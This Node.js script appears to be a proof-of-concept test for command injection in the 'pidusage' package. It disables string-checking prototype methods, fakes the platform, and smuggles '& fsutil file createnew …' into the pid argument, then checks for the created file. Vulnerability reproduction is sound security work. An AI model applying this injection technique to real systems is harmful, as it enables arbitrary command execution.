String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const os = require('os');
os.platform = () => {
    return 'freebsd';
};
const roar_pidusage = require('pidusage');
const fs = require('fs');
const path = './pidusage';
roar_pidusage.stat('& fsutil file createnew pidusage 0', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});